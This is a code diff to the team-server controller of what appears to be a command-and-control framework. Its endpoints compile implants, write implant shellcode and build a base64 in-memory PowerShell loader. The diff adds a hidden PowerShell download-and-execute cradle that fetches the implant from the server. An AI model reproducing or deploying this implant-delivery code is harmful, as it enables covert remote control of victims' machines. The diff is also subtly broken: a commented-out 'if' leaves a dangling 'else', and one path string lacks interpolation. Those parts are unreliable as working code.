@@ -12,18 +12,21 @@ using System.Threading;
 using System.Runtime.InteropServices;
 using TeamServer.Models.Managers;
 using TeamServer.Utilities;
+using Microsoft.AspNetCore.Authorization;
 
 namespace TeamServer.Controllers
 {
+	[Authorize(Roles ="Operator")]
 	[ApiController]
 	[Route("[controller]")]
 	public class EngineersController : ControllerBase
 	{
 		// class member variables 
 		private readonly IEngineerService _Engineers;
+        public static List<Engineer> engineerList = new();
 
-		// Constructor
-		public EngineersController(IEngineerService Engineers)  //done in constructor because it can use the depedency injection to grab that service info. 
+        // Constructor
+        public EngineersController(IEngineerService Engineers)  //done in constructor because it can use the depedency injection to grab that service info. 
 		{
 			_Engineers = Engineers;
 		}
@@ -48,14 +51,35 @@ namespace TeamServer.Controllers
 		[HttpGet("{EngineerId}/tasks/{taskId}", Name = "RetrieveEngineerTaskResults")]
 		public IActionResult GetTaskResult(string EngineerId, string taskId)
 		{
-			var Engineer = _Engineers.GetEngineer(EngineerId);
-			if (Engineer is null) return NotFound("Engineer not found");
-
-			var result = Engineer.GetTaskResult(taskId);
-			if (result is null) return NotFound("Task not found");
-
-			return Ok(result);
-		}
+			var engineer = _Engineers.GetEngineer(EngineerId);
+			if (engineer is null) return NotFound("Engineer not found");
+			//if (Engineer.taskQueueDic.ContainsKey(taskId))
+			//{
+			//	if (Engineer.taskQueueDic[taskId].Count() > 0)
+			//	{
+			//		var task = engineer.DeQueueTaskResults(taskId);
+			//		return Ok(task);
+			//	}
+   //             else
+   //             {
+   //                 var result = engineer.GetTaskResult(taskId);
+   //                 if (result is null)
+   //                 {
+   //                     return NotFound("Task not found");
+   //                 }
+   //                 return Ok(result);
+   //             }
+   //         }
+            else
+            {
+                var result = engineer.GetTaskResult(taskId);
+                if (result is null)
+                {
+                    return NotFound("Task not found");
+                }
+                return Ok(result);
+            }
+        }
 
 		[HttpGet("{EngineerId}/tasks", Name = "RetrieveAllEngineerTasks")]
 		public IActionResult GetTaskResults(string EngineerId)
@@ -81,19 +105,26 @@ namespace TeamServer.Controllers
 				var path = $"{root}/tasks/{task.Id}";
                 //if task.Arguments is not null, turn the dictionary into a string like /key1 value1 /key2 value2 etc
                 var args = task.Arguments is null ? "" : string.Join(" ", task.Arguments.Select(kvp => $"{kvp.Key} {kvp.Value}"));
-                //add the engineerId as the key with a new list of EngineerTask to the Engineer.Previous task Dictionary and add the task to the list of tasks for the engineer
-                if(Engineer.previousTasks.ContainsKey(engineerId))
-				{
-					Engineer.previousTasks[engineerId].Add(task);
-				}
-				else
-				{
-					Engineer.previousTasks.Add(engineerId, new List<EngineerTask>() { task });
-				}
+                EngineerTask taskHeader = new EngineerTask()
+                {
+                    Id = task.Id,
+                    Command = $"({DateTime.UtcNow}) Engineer instructed to {task.Command + " " + args}\n",
+                };
+                HardHatHub.StoreTaskHeader(taskHeader);
+               // add the engineerId as the key with a new list of EngineerTask to the Engineer.Previous task Dictionary and add the task to the list of tasks for the engineer
+                if (Engineer.previousTasks.ContainsKey(engineerId))
+                {
+                    Engineer.previousTasks[engineerId].Add(taskHeader);
+                }
+                else
+                {
+                    Engineer.previousTasks.Add(engineerId, new List<EngineerTask>() { taskHeader });
+                }
 
-                HardHatHub.UpdateOutgoingTaskDic(engineerId, task.Id, task.Command, args);
-				HardHatHub.AlertEventHistory(new HistoryEvent { Event = $"task {task.Command} {args} queued for execution", Status = "info" });
-				return Created(path, task);
+                HardHatHub.UpdateOutgoingTaskDic(engineerId, taskHeader.Id, taskHeader.Command);
+                HardHatHub.AlertEventHistory(new HistoryEvent { Event = $"task {task.Command} {args} queued for execution", Status = "info" });
+                LoggingService.TaskLogger.Information("task {@taskHeader} queued for execution", taskHeader);
+                return Created(path, task);
 			}
             return NotFound();
         }
@@ -269,8 +300,10 @@ namespace TeamServer.Controllers
 					{
 						//Utilities.Compile.RunConfuser(pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}_merged.exe");
 					}
-                    HardHatHub.AlertEventHistory(new HistoryEvent { Event = $"Engineer compiled saved at {pathSplit[0]}..{ allPlatformPathSeperator }Engineer_{ managerName }.exe", Status = "success" });
-					Thread.Sleep(10);
+                    string compiledEngLocation = $"{ pathSplit[0] }..{ allPlatformPathSeperator }Engineer_{ managerName }.exe";
+                    HardHatHub.AlertEventHistory(new HistoryEvent { Event = $"Engineer compiled saved at {compiledEngLocation}", Status = "success" });
+                    LoggingService.EventLogger.Information("Compiled engineer saved at {compiledEngLocation}", compiledEngLocation);
+                    Thread.Sleep(10);
                     return Ok("Compiled Engineer at " + pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}.exe");
 				}
 				catch (Exception ex)
@@ -292,8 +325,11 @@ namespace TeamServer.Controllers
                     System.IO.File.WriteAllBytes(pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}_shellcode.bin", shellcode);
 
                     //Utilities.Compile.RunConfuser(pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}.exe");
-                    HardHatHub.AlertEventHistory(new HistoryEvent { Event = $"Engineer shellcode written to {pathSplit[0]}..{ allPlatformPathSeperator }Engineer_{ managerName }_shellcode.bin", Status = "success" });
-					return Ok("Shellcode file written to " + pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}_shellcode.bin");
+                    string shellLocation = "{pathSplit[0]}..{allPlatformPathSeperator }Engineer_{managerName }_shellcode.bin";
+                    HardHatHub.AlertEventHistory(new HistoryEvent { Event = $"Engineer shellcode written to {shellLocation}", Status = "success" });
+                    LoggingService.EventLogger.Information("Engineer shellcode written to {shellLocation}", shellLocation);
+
+                    return Ok("Shellcode file written to " + pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}_shellcode.bin");
 				}
 				catch (Exception)
 				{
@@ -305,14 +341,18 @@ namespace TeamServer.Controllers
             {
                 try
                 {
-                    string binaryb64 = Convert.ToBase64String(assemblyBytes);
+                    byte[] Mergedengineer = System.IO.File.ReadAllBytes(pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}.exe");
+                    string binaryb64 = Convert.ToBase64String(Mergedengineer);
 					string powershellCommand = $"$a=[System.Reflection.Assembly]::Load([System.Convert]::FromBase64String(\"{binaryb64}\"));$a.EntryPoint.Invoke(0,@(,[string[]]@()))|Out-Null";
                     //write the powershell command to a text file 
                     System.IO.File.WriteAllText(pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}_pscmd.txt", powershellCommand);
 					System.IO.File.WriteAllText(pathSplit[0] + "wwwroot" + $"{allPlatformPathSeperator}Engineer_{managerName}_pscmd.txt", powershellCommand);
-					HardHatHub.AlertEventHistory(new HistoryEvent { Event = $"Engineer powershell command written to {allPlatformPathSeperator}Engineer_{managerName}_pscmd.txt", Status = "success" });
-					HardHatHub.AddPsCommand(powershellCommand);
-                    return Ok("Shellcode file written to " + pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}_pscmd.txt");
+                    string psCommandPath = pathSplit[0] + "wwwroot" + $"{allPlatformPathSeperator}Engineer_{managerName}_pscmd.txt";
+
+                    HardHatHub.AlertEventHistory(new HistoryEvent { Event = $"Engineer powershell command written to {allPlatformPathSeperator}Engineer_{managerName}_pscmd.txt", Status = "success" });
+                    LoggingService.EventLogger.Information("Engineer powershell command written to {psCommandPath}",psCommandPath);
+                    HardHatHub.AddPsCommand($"powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('https://TeamserverIp:HttpManagerPort/Engineer_{managerName}_pscmd.txt'))\"");
+                    return Ok("Powershell command written to " + pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}_pscmd.txt");
                 }
                 catch (Exception)
                 {
